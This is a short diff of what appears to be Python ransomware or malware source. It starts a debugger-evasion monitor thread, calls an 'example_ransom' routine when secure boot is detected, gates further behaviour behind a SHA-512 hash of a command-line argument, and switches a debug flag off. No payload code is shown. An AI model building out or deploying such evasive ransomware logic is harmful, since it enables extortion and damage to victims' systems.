@@ -20,7 +20,7 @@ def main():
     Thread(target=debugEvasion.process_monitor,args=()).start()
     if is_secure_boot(): #the function is not recognizing secure boot!
         example_ransom()
-    debug = True
+    debug = False
     if len(sys.argv) > 0:
         try:
             if sha512(sys.argv[1].encode()).hexdigest() == 'd983a2437d298f8c263ad51604d4c49dba2fe7a2ec81419f404931caf9d1b0bc2031373b2a731e00e6ebdbfac446b757be0cf7101ae852cc9fd45e42c80fb102':
